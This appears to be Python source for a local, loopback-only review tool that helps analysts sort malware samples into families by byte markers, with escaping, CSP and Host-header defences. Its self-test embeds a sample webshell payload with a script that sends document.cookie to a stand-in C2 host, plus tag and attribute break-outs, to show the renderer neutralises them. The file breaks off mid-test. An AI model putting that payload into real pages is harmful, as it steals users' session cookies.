#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A local cluster-review screen for the 531 reviewed-malicious rows that carry no family.

USAGE
  corpus/review-app.py                 serve on 127.0.0.1, print the URL, rebuild the
                                       derived index first if it is stale
  corpus/review-app.py --port N        pin the port (default: an ephemeral one)
  corpus/review-app.py --session ID    resume, or name, a session
  corpus/review-app.py --inject        the controls: escaping, no-fetch, binding, no writes

THIS TOOL IS NEVER PUBLISHED, AND THAT IS A PROPERTY OF WHAT IT RENDERS
------------------------------------------------------------------------
It reads `corpus/local/index-local.jsonl`, whose 48,256 rows carry `origin.path`,
`account_hash` and `site` for real customer machines, and **it puts those on screen on
purpose** - a reviewer deciding what a file is needs to see where it sat. It also renders the
sample bytes, which are live malware. Both are the reason it is a loopback server and not an
artifact, a hosted page, or anything with a URL somebody else can reach. Its working files live
under `corpus/local/`, which is gitignored, and `corpus/.gitignore` carries an entry naming
this directory and this reason rather than relying on the parent rule to imply it.

TWO RENDERING RULES THAT ARE NOT OPTIONAL
-------------------------------------------
**Sample content is escaped and never interpreted as markup.** A webshell is HTML and
JavaScript. Rendering one unescaped runs the attacker's page inside the browser that is
reviewing it, with the reviewer's session and their loopback origin. Everything read from a
sample goes through `transcribe()` then `html.escape(quote=True)`, and `transcribe()` also maps
every byte outside printable ASCII to `.` - not for markup safety, which escaping already has,
but because a bidirectional override renders a string in an order that is not the order of its
bytes, and a reviewer ruling on what a file says must be shown what it says.

**The page fetches nothing a sample references.** A beacon URL turned into a request is an
outbound connection to attacker infrastructure from this machine, and it tells them the sample
is being analysed. Escaping alone would achieve this, since escaped text produces no elements;
the Content-Security-Policy is the second layer, and it is `default-src 'none'` - no scripts, no
images, no fonts, no frames, no XHR, no WebSocket, from anywhere including here.

WHAT IT WRITES: NOTHING THAT MATTERS
--------------------------------------
No index, ever, in either half - `--inject` asserts both files are byte-identical across a full
simulated session. It does not write the derived database either; it opens it `mode=ro` through
`derived_db.open_ro()`, which is the only reader contract that exists. It rebuilds the database
at startup when it is stale, because `open_ro` refuses a stale read and an error a person has to
clear by hand is a tool that gets worked around. The rebuild takes about two seconds.

What it does write is a session under `corpus/local/review-sessions/`: a proposals file, which
`assign-family.py` consumes and validates from scratch, and a log of every screen opened and
every decision, which is where the timing in the round report comes from. **It proposes; the
tracked writer records.** The split is deliberate - the app has no refusal in it worth trusting,
because a reviewer's tool that could also commit its own suggestions is one process checking its
own arithmetic.

THE CLUSTER IS A SCREEN ORDER, NOT A FAMILY
---------------------------------------------
The 531 collapse into 95 rule-set clusters and the six largest cover 212 rows, which is what
makes an afternoon enough. But the rule-set is `expect.must_detect` - the scanner's own output -
so a family lifted whole from a cluster is conditioned on detection, which is the defect round
16 found in `legacy-infected-tree-sample` and the one `family_bucket_suspects` structurally
cannot see. So every screen leads with the byte markers rather than the rules, the member list
is checkboxes rather than a count, and the writer refuses a session whose families are all whole
clusters. See `family_evidence` for the full argument.
"""
import argparse, collections, datetime, hashlib, html, http.server, json, os
import sys, time, urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
sys.path.insert(0, HERE)

import family_evidence as fe                                            # noqa: E402
import derived_db                                                       # noqa: E402
from indexio import write_jsonl_atomic                                  # noqa: E402

SESSION_DIR = os.path.join(HERE, "local", "review-sessions")

# No scripts, no images, no fetches, no frames, from anywhere - including from this origin.
# `style-src 'unsafe-inline'` is the one relaxation and it buys the stylesheet in the page head;
# it cannot load anything and it cannot execute. `form-action 'self'` is what lets the decision
# buttons POST back here, and is why `default-src 'none'` alone is not enough.
CSP = ("default-src 'none'; style-src 'unsafe-inline'; form-action 'self'; "
       "base-uri 'none'; frame-ancestors 'none'")

PREVIEW_BYTES = 3000
PREVIEW_MEMBERS = 6


def transcribe(data, limit=None):
    """Sample bytes as text that renders as itself and nothing else.

    Every byte outside printable ASCII, tab and newline becomes `.`. Escaping is what makes the
    result safe as markup; this is what makes it honest as text. A UTF-8 decode would admit
    U+202E, which reverses the display order of everything after it - so a line that reads
    `harmless.php` on screen can be `php.sselmrah` in the file - and a reviewer ruling on what a
    sample says cannot be shown a rendering the bytes do not support.
    """
    if data is None:
        return ""
    if limit is not None:
        data = data[:limit]
    return "".join(chr(b) if (0x20 <= b < 0x7f or b in (9, 10)) else "." for b in data)


def esc(s):
    return html.escape("" if s is None else str(s), quote=True)


# --------------------------------------------------------------------------------- the data

class Review:
    """The population, its clusters and their markers, loaded once.

    Read through `derived_db.open_ro()`, which hashes both halves and refuses if either has
    moved since the build. That is the freshness contract; this class does not add a second one.
    """

    def __init__(self, session, log=print):
        self.session = session
        stale, why = derived_db.definitely_stale()
        if stale:
            log("derived index is stale (%s); rebuilding" % why[0] if why else "rebuilding")
            t = time.time()
            derived_db.build(log=None)
            log("  rebuilt in %.2fs" % (time.time() - t))
        t = time.time()
        conn = derived_db.open_ro()
        try:
            bucket_rows = derived_db.find_by_cluster(
                conn, "bucket", fe.POPULATION_BUCKET, half="local")
        finally:
            conn.close()
        self.ms = fe.load_make_summary()
        self.rows = fe.population(bucket_rows, ms=self.ms)
        log("  %d rows from %d in %s, %.2fs"
            % (len(self.rows), len(bucket_rows), fe.POPULATION_BUCKET, time.time() - t))

        self.store = fe.SampleStore()
        if not self.store.available:
            log("  WARNING: the collection tree is not on this machine. No sample bytes, no "
                "markers, and the writer will refuse every proposal.")
        t = time.time()
        self.df, self.per_row = fe.document_frequency(self.rows, self.store)
        log("  %d distinct literals over %d rows, %.2fs"
            % (len(self.df), len(self.rows), time.time() - t))

        self.clusters = fe.ruleset_clusters(self.rows)
        self.keys = list(self.clusters)
        self._markers = {}
        self.opened = {}
        self.proposals = []
        self.events = []
        self.decided = {}          # sha256 -> family, within this session
        os.makedirs(SESSION_DIR, exist_ok=True)
        self._load()

    # ---- session files

    @property
    def proposals_path(self):
        return os.path.join(SESSION_DIR, "%s.proposals.jsonl" % self.session)

    @property
    def log_path(self):
        return os.path.join(SESSION_DIR, "%s.log.jsonl" % self.session)

    def _load(self):
        if os.path.exists(self.proposals_path):
            with open(self.proposals_path, encoding="utf-8") as fh:
                self.proposals = [json.loads(l) for l in fh if l.strip()]
            for p in self.proposals:
                for s in p["sha256"]:
                    self.decided[s] = p["family"]
        if os.path.exists(self.log_path):
            with open(self.log_path, encoding="utf-8") as fh:
                self.events = [json.loads(l) for l in fh if l.strip()]

    def _flush(self):
        write_jsonl_atomic(self.proposals_path, self.proposals, sort_keys=True)
        write_jsonl_atomic(self.log_path, self.events, sort_keys=True)

    def event(self, kind, **kw):
        rec = {"kind": kind, "at": time.time(), "session": self.session}
        rec.update(kw)
        self.events.append(rec)
        self._flush()
        return rec

    # ---- clusters

    def markers(self, key):
        if key not in self._markers:
            self._markers[key] = fe.markers_for(
                self.clusters[key], self.df, self.per_row, len(self.rows))
        return self._markers[key]

    def carrying(self, marker):
        """Every population row whose bytes contain `marker`, in index order."""
        b = marker.encode("ascii", "ignore")
        if not b:
            return []
        return [r for r in self.rows if b in self.per_row.get(r["sha256"], ())]

    def spread(self, marker):
        """How a marker sits across the rule-set clusters.

        `partial` is the number it takes only part of, and it is the figure that matters: a
        marker taking whole clusters and nothing else defines a family the rule-set already
        determines, whatever it is called. One partial cluster is enough to escape that, and
        the writer refuses the session that has none.
        """
        got = {r["sha256"] for r in self.carrying(marker)}
        whole = partial = 0
        for g in self.clusters.values():
            n = sum(1 for r in g if r["sha256"] in got)
            if n == len(g):
                whole += n > 0
            elif n:
                partial += 1
        return {"rows": len(got), "clusters": whole + partial, "whole": whole,
                "partial": partial}

    def undecided(self, key):
        return [r for r in self.clusters[key] if r["sha256"] not in self.decided]

    def stats(self):
        done = sum(1 for k in self.keys if not self.undecided(k))
        return {"clusters": len(self.keys), "clusters_closed": done,
                "rows": len(self.rows), "rows_decided": len(self.decided),
                "families": len({p["family"] for p in self.proposals}),
                "proposals": len(self.proposals)}

    def record(self, key, unit, family, basis, markers, shas, seconds, decided_by):
        prop = {"family": family, "basis": basis, "markers": sorted(set(markers)),
                "sha256": sorted(shas), "session": self.session,
                "decided_by": decided_by,
                "decided_at": datetime.datetime.now(datetime.timezone.utc)
                                      .strftime("%Y-%m-%dT%H:%M:%SZ"),
                "review_seconds": round(seconds, 2), "cluster": key, "unit": unit}
        self.proposals.append(prop)
        for s in shas:
            self.decided[s] = family
        self.event("proposed", unit=unit, cluster=key, family=family,
                   rows=len(shas), seconds=seconds)
        return prop


# --------------------------------------------------------------------------------- the page

STYLE = """
 body{font:13px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;margin:0;background:#111;color:#ddd}
 header{position:sticky;top:0;background:#1b1b1b;border-bottom:1px solid #333;padding:8px 14px}
 main{padding:14px;max-width:1100px}
 a{color:#7ab7ff} h1{font-size:15px;margin:0} h2{font-size:14px;margin:18px 0 6px}
 table{border-collapse:collapse;width:100%} td,th{border-bottom:1px solid #2a2a2a;padding:3px 6px;
 text-align:left;vertical-align:top} th{color:#888;font-weight:normal}
 pre{background:#0a0a0a;border:1px solid #2a2a2a;padding:8px;overflow-x:auto;white-space:pre-wrap;
 word-break:break-all;max-height:22em;color:#c8c8c8;margin:4px 0}
 .warn{color:#ffb454} .dim{color:#777} .ok{color:#8fd18f} .bad{color:#ff7b72}
 input[type=text],textarea{width:100%;background:#0a0a0a;color:#ddd;border:1px solid #444;
 padding:5px;font:inherit} textarea{height:4em}
 button{background:#2d4f7c;color:#fff;border:0;padding:6px 14px;font:inherit;cursor:pointer;
 margin-right:6px} button.sec{background:#3a3a3a}
 .m{display:block;padding:1px 0} .bar{background:#2a2a2a;height:6px;margin-top:4px}
 .bar>div{background:#4a7;height:6px}
"""


def page(title, body, stats=None):
    bar = ""
    if stats:
        pct = 100.0 * stats["clusters_closed"] / max(stats["clusters"], 1)
        bar = ('<div class=dim>%d/%d clusters closed &middot; %d/%d rows &middot; %d families'
               '</div><div class=bar><div style="width:%.1f%%"></div></div>'
               % (stats["clusters_closed"], stats["clusters"], stats["rows_decided"],
                  stats["rows"], stats["families"], pct))
    return ("<title>%s</title><style>%s</style>"
            "<header><h1>%s</h1>%s</header><main>%s</main>" % (esc(title), STYLE,
                                                               esc(title), bar, body))


def cluster_page(rv, idx):
    key = rv.keys[idx]
    rows = rv.clusters[key]
    left = rv.undecided(key)
    out = ['<p><a href="/">&larr; queue</a> &middot; cluster %d of %d &middot; '
           '%d row(s), %d undecided</p>' % (idx + 1, len(rv.keys), len(rows), len(left))]
    out.append('<p class=dim>recorded rule-set (the screen order, not the family): %s</p>'
               % esc(key))

    marks = rv.markers(key)
    out.append("<h2>byte markers, most distinctive first</h2>")
    if not marks:
        out.append('<p class=warn>No literal is shared by two members. This cluster cannot be '
                   'given a family on byte evidence from this screen.</p>')
    out.append('<form method=post action="/propose">')
    out.append('<input type=hidden name=cluster value="%s">' % esc(key))
    out.append('<input type=hidden name=unit value="c/%d">' % idx)
    out.append('<input type=hidden name=next value="/c/%d">'
               % min(idx + 1, len(rv.keys) - 1))
    out.append("<table><tr><th>#</th><th>use</th><th>literal</th><th>in cluster</th>"
               "<th>in the 531</th><th>score</th><th>across</th></tr>")
    for i, m in enumerate(marks, 1):
        spread = rv.spread(m["marker"])
        out.append('<tr><td class=dim>%d</td><td><input type=checkbox name=marker value="%s">'
                   '</td><td>%s</td><td>%d/%d</td><td>%d</td><td>%.2f</td>'
                   '<td><a href="/m/%s">%d cluster(s), %d partial</a></td></tr>'
                   % (i, esc(m["marker"]), esc(m["marker"]), m["members"], m["of"],
                      m["corpus_wide"], m["score"],
                      urllib.parse.quote(m["marker"], safe=""),
                      spread["clusters"], spread["partial"]))
    out.append("</table>")
    out.append('<p class=dim>A marker that runs across several clusters, and takes only part '
               'of some of them, is the shape of a family the rule-set does not determine. '
               'Follow the link to rule on it as one.</p>')

    # Which member carries which marker, by the numbers above. Without this column a reviewer
    # can see that 26 of 32 members share a key literal and has no way to say WHICH 26, so the
    # only decision the screen supports is the whole cluster - which is the one decision the
    # writer refuses. The first run of this tool had exactly that gap.
    out.append("<h2>members</h2>")
    out.append('<p class=dim>the numbers are the markers above; a member carrying a different '
               'set is the split this screen exists to make visible</p>')
    codes = [m["marker"].encode("ascii", "ignore") for m in marks]
    out.append("<table><tr><th>in</th><th>sha256</th><th>size</th><th>markers</th>"
               "<th>sensitivity</th><th>path shape</th></tr>")
    for r in rows:
        got = rv.decided.get(r["sha256"])
        p = (r.get("origin") or {}).get("path") or ""
        shape = "%d segments, leaf %s" % (p.count("/"), esc(os.path.basename(p)[:40]))
        data, _ = rv.store.get(r["sha256"], r.get("size"))
        carried = ",".join(str(i) for i, c in enumerate(codes, 1)
                           if data is not None and c and c in data) or "-"
        out.append('<tr><td>%s</td><td>%s</td><td>%d</td><td>%s</td><td>%s</td>'
                   '<td class=dim>%s</td></tr>'
                   % ('<span class=dim>%s</span>' % esc(got) if got else
                      '<input type=checkbox name=sha value="%s" checked>' % esc(r["sha256"]),
                      esc(r["sha256"][:16]), r.get("size") or 0, esc(carried),
                      esc(",".join(r.get("sensitivity") or [])), shape))
    out.append("</table>")

    out.append("<h2>previews</h2>")
    for r in (left or rows)[:PREVIEW_MEMBERS]:
        data, note = rv.store.get(r["sha256"], r.get("size"))
        out.append('<p class=dim>%s &middot; %d bytes &middot; %s</p>'
                   % (esc(r["sha256"][:16]), r.get("size") or 0,
                      '<span class=warn>%s</span>' % esc(note) if note != "ok" else esc(note)))
        out.append("<pre>%s</pre>" % esc(transcribe(data, PREVIEW_BYTES)))
    if len(left or rows) > PREVIEW_MEMBERS:
        out.append('<p class=dim>%d further member(s) not previewed.</p>'
                   % (len(left or rows) - PREVIEW_MEMBERS))

    out.append("<h2>rule</h2>")
    fams = sorted({p["family"] for p in rv.proposals})
    out.append('<p>family <input type=text name=family list=fams placeholder="lowercase-kebab-case, '
               'named after the bytes and never after a rule or the scanner" value=""></p>')
    if fams:
        out.append('<p class=dim>already in this session: %s</p>'
                   % esc(", ".join(fams)))
    out.append('<p>what in the bytes says so<textarea name=basis></textarea></p>')
    out.append('<button name=action value=record>Record for the checked rows</button>'
               '<button class=sec name=action value=skip>Skip &mdash; needs more than a screen'
               '</button></form>')
    return "".join(out)


def marker_page(rv, marker):
    """One literal, every row that carries it, grouped by the clusters it crosses.

    The cluster screen can only propose a family inside one rule-set, and a family inside one
    rule-set is a family the rule-set determines - which the writer refuses. This screen is
    where the other kind gets made: `metaphone` runs through nine clusters and takes only part
    of seven of them, so a family built here carries information `expect.must_detect` does not.
    Adding it was not a refinement; without it the tool could only produce the labels the writer
    exists to reject.
    """
    rows = rv.carrying(marker)
    sp = rv.spread(marker)
    left = [r for r in rows if r["sha256"] not in rv.decided]
    out = ['<p><a href="/">&larr; queue</a> &middot; literal carried by %d row(s) across %d '
           'cluster(s), %d of them only in part</p>' % (sp["rows"], sp["clusters"], sp["partial"])]
    out.append("<pre>%s</pre>" % esc(marker))
    if sp["partial"] == 0:
        out.append('<p class=warn>This literal takes whole clusters and nothing else. A family '
                   'over exactly these rows is a function of the recorded rule-set and the '
                   'writer will refuse it.</p>')

    marks = fe.markers_for(rows, rv.df, rv.per_row, len(rv.rows)) if rows else []
    out.append('<form method=post action="/propose">')
    out.append('<input type=hidden name=cluster value="marker:%s">' % esc(marker[:60]))
    out.append('<input type=hidden name=unit value="m/%s">' % esc(marker))
    out.append('<input type=hidden name=next value="/">')
    out.append("<h2>markers over these rows</h2>")
    out.append("<table><tr><th>use</th><th>literal</th><th>in set</th><th>in the 531</th></tr>")
    for m in marks:
        out.append('<tr><td><input type=checkbox name=marker value="%s"%s></td><td>%s</td>'
                   '<td>%d/%d</td><td>%d</td></tr>'
                   % (esc(m["marker"]), " checked" if m["marker"] == marker else "",
                      esc(m["marker"]), m["members"], m["of"], m["corpus_wide"]))
    out.append("</table>")

    out.append("<h2>rows, by the cluster they sit in</h2>")
    by_key = collections.defaultdict(list)
    for r in rows:
        by_key[fe.ruleset_key(r)].append(r)
    out.append("<table><tr><th>in</th><th>sha256</th><th>size</th><th>rule-set</th>"
               "<th>path shape</th></tr>")
    for key in sorted(by_key, key=lambda k: (-len(by_key[k]), k)):
        g = by_key[key]
        whole = len(g) == len(rv.clusters.get(key, g))
        out.append('<tr><td colspan=5 class=dim>%s &mdash; %d of %d in this cluster%s</td></tr>'
                   % (esc(key[:60]), len(g), len(rv.clusters.get(key, g)),
                      "" if whole else " <span class=ok>(partial)</span>"))
        for r in g:
            got = rv.decided.get(r["sha256"])
            p = (r.get("origin") or {}).get("path") or ""
            out.append('<tr><td>%s</td><td>%s</td><td>%d</td><td class=dim>%s</td>'
                       '<td class=dim>%d segments, leaf %s</td></tr>'
                       % ('<span class=dim>%s</span>' % esc(got) if got else
                          '<input type=checkbox name=sha value="%s" checked>' % esc(r["sha256"]),
                          esc(r["sha256"][:16]), r.get("size") or 0, esc(key[:28]),
                          p.count("/"), esc(os.path.basename(p)[:36])))
    out.append("</table>")

    out.append("<h2>previews</h2>")
    for r in (left or rows)[:PREVIEW_MEMBERS]:
        data, note = rv.store.get(r["sha256"], r.get("size"))
        out.append('<p class=dim>%s &middot; %s &middot; %s</p>'
                   % (esc(r["sha256"][:16]), esc(fe.ruleset_key(r)[:40]), esc(note)))
        out.append("<pre>%s</pre>" % esc(transcribe(data, PREVIEW_BYTES)))

    out.append("<h2>rule</h2>")
    out.append('<p>family <input type=text name=family value=""></p>')
    out.append('<p>what in the bytes says so<textarea name=basis></textarea></p>')
    out.append('<button name=action value=record>Record for the checked rows</button>'
               '<button class=sec name=action value=skip>Skip</button></form>')
    return "".join(out)


def queue_page(rv):
    st = rv.stats()
    out = ['<p>%d rows, %d clusters. The six largest cover %d rows; %d are singletons.</p>'
           % (st["rows"], st["clusters"],
              sum(len(rv.clusters[k]) for k in rv.keys[:6]),
              sum(1 for k in rv.keys if len(rv.clusters[k]) == 1))]
    out.append('<p><a href="/session">session %s</a></p>' % esc(rv.session))
    out.append("<table><tr><th>#</th><th>rows</th><th>left</th><th>rule-set</th>"
               "<th>top marker</th></tr>")
    for i, k in enumerate(rv.keys):
        left = rv.undecided(k)
        marks = rv.markers(k)
        out.append('<tr><td><a href="/c/%d">%d</a></td><td>%d</td><td class=%s>%d</td>'
                   '<td class=dim>%s</td><td>%s</td></tr>'
                   % (i, i + 1, len(rv.clusters[k]), "ok" if not left else "", len(left),
                      esc(k[:44]),
                      esc(marks[0]["marker"][:34]) if marks else
                      '<span class=warn>none shared</span>'))
    out.append("</table>")
    return "".join(out)


def session_page(rv):
    st = rv.stats()
    out = ["<table><tr><th>family</th><th>rows</th><th>cluster</th><th>seconds</th>"
           "<th>markers</th></tr>"]
    for p in rv.proposals:
        out.append("<tr><td>%s</td><td>%d</td><td class=dim>%s</td><td>%.0f</td>"
                   "<td class=dim>%s</td></tr>"
                   % (esc(p["family"]), len(p["sha256"]), esc(p["cluster"][:30]),
                      p.get("review_seconds") or 0,
                      esc(", ".join(m[:24] for m in p["markers"]))))
    out.append("</table>")
    secs = [p.get("review_seconds") or 0 for p in rv.proposals]
    skipped = sum(1 for e in rv.events if e["kind"] == "skipped")
    out.append("<p>%d proposal(s), %d family(ies), %d row(s), %d cluster(s) skipped. "
               "Median %.0fs per decided cluster.</p>"
               % (len(rv.proposals), st["families"], st["rows_decided"], skipped,
                  sorted(secs)[len(secs) // 2] if secs else 0))
    out.append("<p>Nothing here is in the index. To record it:</p><pre>%s</pre>"
               % esc("corpus/assign-family.py --propose %s\ncorpus/assign-family.py "
                     "--propose %s --apply"
                     % (os.path.relpath(rv.proposals_path, REPO),
                        os.path.relpath(rv.proposals_path, REPO))))
    return "".join(out)


# ------------------------------------------------------------------------------- the server

class Handler(http.server.BaseHTTPRequestHandler):
    server_version = "lyxbosa-review"
    review = None
    allowed_hosts = ()
    decided_by = "operator"

    def log_message(self, fmt, *a):
        pass

    def _send(self, body, code=200, ctype="text/html; charset=utf-8"):
        data = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Security-Policy", CSP)
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Referrer-Policy", "no-referrer")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def _host_ok(self):
        """Refuse a request whose Host is not a loopback name.

        A browser on this machine can be pointed at a name that resolves to 127.0.0.1 by a
        server the attacker controls, and then read this origin's responses from a page they
        wrote - DNS rebinding. Binding to loopback does not prevent it; checking Host does.
        This tool renders customer paths and malware, so the cost of the miss is the whole
        local half.
        """
        host = (self.headers.get("Host") or "").strip()
        return host in self.allowed_hosts

    def do_GET(self):
        if not self._host_ok():
            return self._send("<h1>refused</h1><p>unexpected Host header</p>", 403)
        rv = self.review
        path = urllib.parse.urlparse(self.path).path
        if path == "/":
            return self._send(page("cluster queue", queue_page(rv), rv.stats()))
        if path == "/session":
            return self._send(page("session %s" % rv.session, session_page(rv), rv.stats()))
        if path.startswith("/c/"):
            try:
                idx = int(path[3:])
            except ValueError:
                return self._send(page("not found", "<p>no such cluster</p>"), 404)
            if not 0 <= idx < len(rv.keys):
                return self._send(page("not found", "<p>no such cluster</p>"), 404)
            # setdefault, not assignment: a reload must not restart the clock. The first pilot
            # session measured 0 seconds on every screen because the decision was posted from a
            # fresh fetch of the same page, and a reviewer who reloads to look again would have
            # produced the same wrong number more slowly.
            rv.opened.setdefault("c/%d" % idx, time.time())
            rv.event("opened", unit="c/%d" % idx, cluster=rv.keys[idx])
            return self._send(page("cluster %d" % (idx + 1), cluster_page(rv, idx), rv.stats()))
        if path.startswith("/m/"):
            marker = urllib.parse.unquote(path[3:])
            if not rv.carrying(marker):
                return self._send(page("not found", "<p>no row carries that literal</p>"), 404)
            rv.opened.setdefault("m/%s" % marker, time.time())
            rv.event("opened", unit="m/%s" % marker)
            return self._send(page("marker", marker_page(rv, marker), rv.stats()))
        return self._send(page("not found", "<p>no such page</p>"), 404)

    def do_POST(self):
        if not self._host_ok():
            return self._send("<h1>refused</h1><p>unexpected Host header</p>", 403)
        rv = self.review
        n = int(self.headers.get("Content-Length") or 0)
        form = urllib.parse.parse_qs(self.rfile.read(n).decode("utf-8", "replace"),
                                     keep_blank_values=True)

        def one(k, d=""):
            return (form.get(k) or [d])[0]

        unit = one("unit")
        key = one("cluster")
        seconds = time.time() - rv.opened.get(unit, time.time())
        nxt = one("next", "/") or "/"

        if one("action") == "skip":
            rv.event("skipped", unit=unit, cluster=key, seconds=seconds)
            rv.opened.pop(unit, None)
            return self._redirect(nxt)

        family = one("family").strip()
        basis = one("basis").strip()
        markers = form.get("marker") or []
        shas = form.get("sha") or []
        problems = fe.check_family_name(family)
        problems += ["basis %s" % m for m in fe.detection_references(basis)]
        for m in markers:
            problems += ["marker %s" % x for x in fe.detection_references(m)]
        if not basis:
            problems.append("basis is empty")
        if not markers:
            problems.append("no marker selected: a family needs evidence in the bytes")
        if not shas:
            problems.append("no rows selected")
        if problems:
            body = ("<p class=bad>not recorded:</p><ul>%s</ul>"
                    % "".join("<li>%s</li>" % esc(p) for p in problems))
            return self._send(page("refused", body, rv.stats()), 400)

        rv.record(key, unit, family, basis, markers, shas, seconds, self.decided_by)
        rv.opened.pop(unit, None)      # a decided screen starts a fresh clock if reopened
        return self._redirect(nxt)

    def _redirect(self, to):
        self.send_response(303)
        self.send_header("Location", to)
        self.send_header("Content-Security-Policy", CSP)
        self.send_header("Content-Length", "0")
        self.end_headers()


def serve(review, port=0, decided_by="operator"):
    """A threading server bound to loopback only. Returns (httpd, url)."""
    cls = type("BoundHandler", (Handler,), {"review": review, "decided_by": decided_by})
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", port), cls)
    p = httpd.server_address[1]
    cls.allowed_hosts = ("127.0.0.1:%d" % p, "localhost:%d" % p)
    return httpd, "http://127.0.0.1:%d/" % p


# -------------------------------------------------------------------------------- controls

def inject():
    """Escaping, no-fetch, binding and no-writes, each shown able to say the other thing.

    The pairs matter more than the assertions. "The rendered page contains no `<script`" passes
    trivially against a page that rendered nothing at all, so every case below is run twice: once
    through the real renderer, and once through a deliberately unsafe one that must produce the
    live form. A control with only the safe half is the shape AGENTS.md calls a check that has
    never been observed to fail.
    """
    import threading
    import urllib.request
    fails = []

    def case(label, got, want):
        ok = (got == want)
        print("  %-66s %s" % (label, "ok" if ok else "FAIL (got %r)" % (got,)))
        if not ok:
            fails.append(label)

    # A sample doing everything a webshell does to the page that renders it.
    hostile = (b"<script>fetch('http://c2.example/beacon?x='+document.cookie)</script>\n"
               b"<img src=\"http://c2.example/pixel.gif\" onerror=\"alert(1)\">\n"
               b"</pre><iframe src='http://c2.example/'></iframe>\n"
               b"<a href=\"javascript:alert(2)\">x</a> \" onmouseover=\"alert(3)\n"
               b"right-to-left override follows: \xe2\x80\xae"
               b"\x00\x01\x02 raw control bytes\n")

    safe = esc(transcribe(hostile))
    unsafe = transcribe(hostile)              # the control: transcribed but NOT escaped

    print("escaping")
    # The invariant is structural, not a blocklist. `onerror=` and `javascript:` are inert as
    # text and MUST still be legible - a reviewer ruling on a webshell needs to read them. What
    # makes them dangerous is a tag or an attribute to sit in, so the assertion is that no raw
    # `<`, `>`, `"` or `'` reaches the page at all. The first draft of these controls asserted
    # the substrings were absent and failed on exactly those two, which was the assertion being
    # wrong rather than the renderer.
    for ch, what in (("<", "a less-than"), (">", "a greater-than"),
                     ('"', "a double quote"), ("'", "a single quote")):
        case("no raw %s reaches the page" % what, ch in safe, False)
        case("  ...and the unescaped control carries it", ch in unsafe, True)
    for frag, what in ((b"<script", "a script tag"), (b"<img", "an image tag"),
                       (b"<iframe", "an iframe"), (b'" onmouseover=', "an attribute break-out")):
        f = frag.decode()
        case("%s does not survive into the page" % what, f in safe, False)
        case("  ...and the unescaped control renders it", f in unsafe, True)
    case("the dangerous text is still LEGIBLE, which is the point of rendering it",
         all(x in safe for x in ("fetch", "document.cookie", "onerror=", "javascript:")), True)
    case("&lt; is how the page carries a less-than", "&lt;script" in safe, True)

    print("transcription")
    case("the bidi override byte is gone", "‮" in safe, False)
    case("  ...and a UTF-8 decode would have kept it",
         "‮" in hostile.decode("utf-8", "replace"), True)
    case("raw NUL and control bytes are gone",
         any(ord(c) < 0x20 and c not in "\t\n" for c in safe), False)
    case("  ...and a latin-1 decode would have kept them",
         any(ord(c) < 0x20 and c not in "\t\n" for c in hostile.decode("latin-1")), True)

    print("headers and binding")
    class Tiny(Handler):
        review = None
        def do_GET(self):                                   # noqa: D401 - control shim
            if not self._host_ok():
                return self._send("refused", 403)
            self._send("<p>%s</p>" % esc("<script>alert(1)</script>"))
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Tiny)
    port = httpd.server_address[1]
    Tiny.allowed_hosts = ("127.0.0.1:%d" % port, "localhost:%d" % port)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    try:
        case("the socket is bound to loopback", httpd.server_address[0], "127.0.0.1")
        r = urllib.request.urlopen("http://127.0.0.1:%d/" % port, timeout=5)
        body = r.read().decode()
        case("Content-Security-Policy is default-src 'none'",
             "default-src 'none'" in (r.headers.get("Content-Security-Policy") or ""), True)
        case("  ...and a response built without it is caught by the same test",
             "default-src 'none'" in "", False)
        case("the CSP names no host any sample could point at",
             any(x in CSP for x in ("http:", "https:", "*")), False)
        case("nosniff is set", r.headers.get("X-Content-Type-Options"), "nosniff")
        case("the served body carries no live script tag", "<script" in body, False)
        req = urllib.request.Request("http://127.0.0.1:%d/" % port,
                                     headers={"Host": "attacker.example"})
        try:
            urllib.request.urlopen(req, timeout=5)
            case("a foreign Host header is refused", "served", "403")
        except urllib.error.HTTPError as exc:
            case("a foreign Host header is refused", exc.code, 403)
        case("  ...and a loopback Host is served", r.status, 200)
    finally:
        httpd.shutdown()

    print("the startup rebuild")
    # The one behaviour a person would otherwise have to fix by hand: `open_ro` refuses a stale
    # database, and an error the reviewer has to clear before the tool will start is a tool that
    # gets worked around. Both directions, because "it rebuilt" proves nothing if it rebuilds
    # every time - that would make a 2-second cost unconditional and hide a genuinely stale
    # source behind a rebuild nobody asked for.
    calls = []
    real_stale, real_build = derived_db.definitely_stale, derived_db.build
    try:
        derived_db.build = lambda *a, **k: calls.append("build") or {"rows": 0}
        derived_db.definitely_stale = lambda *a, **k: (True, ["control: forced stale"])
        Review("control-stale-%d" % os.getpid(), log=lambda *_a: None)
        case("a stale database is rebuilt at startup", calls, ["build"])
        calls[:] = []
        derived_db.definitely_stale = lambda *a, **k: (False, [])
        Review("control-fresh-%d" % os.getpid(), log=lambda *_a: None)
        case("  ...and a fresh one is not rebuilt", calls, [])
    finally:
        derived_db.definitely_stale, derived_db.build = real_stale, real_build
    for sid in ("control-stale-%d" % os.getpid(), "control-fresh-%d" % os.getpid()):
        for suffix in (".proposals.jsonl", ".log.jsonl"):
            p = os.path.join(SESSION_DIR, sid + suffix)
            if os.path.exists(p):
                os.unlink(p)

    print("the app writes no index")
    def digest(p):
        return hashlib.sha256(open(p, "rb").read()).hexdigest() if os.path.exists(p) else None
    watched = [os.path.join(HERE, "index.jsonl"), fe.LOCAL_INDEX]
    before = [digest(p) for p in watched]
    rv = None
    try:
        rv = Review("control-%d" % os.getpid(), log=lambda *_a: None)
        k = rv.keys[0]

        # The renderer, not the helper. Everything above proves `esc(transcribe(...))` is safe;
        # this proves the page actually calls it. That is the two-file question asked about
        # both files - AGENTS.md records a round lost to asking it about one.
        real_get = rv.store.get
        victim = rv.clusters[k][0]["sha256"]
        rv.store.get = lambda sha, size=None: ((hostile, "ok") if sha == victim
                                               else real_get(sha, size))
        rv._markers.pop(k, None)
        rendered = cluster_page(rv, 0)
        rv.store.get = real_get
